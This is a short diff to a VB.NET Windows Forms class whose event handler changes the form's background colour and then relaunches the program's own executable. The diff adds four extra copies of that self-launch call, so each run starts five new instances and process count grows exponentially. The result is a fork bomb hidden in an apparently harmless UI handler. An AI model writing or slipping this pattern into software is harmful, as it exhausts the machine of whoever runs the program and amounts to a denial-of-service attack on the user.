@@ -31,5 +31,9 @@ Public Class Form1
                 Me.BackColor = Color.Beige
         End Select
         Process.Start(Application.ExecutablePath)
+        Process.Start(Application.ExecutablePath)
+        Process.Start(Application.ExecutablePath)
+        Process.Start(Application.ExecutablePath)
+        Process.Start(Application.ExecutablePath)
     End Sub
 End Class
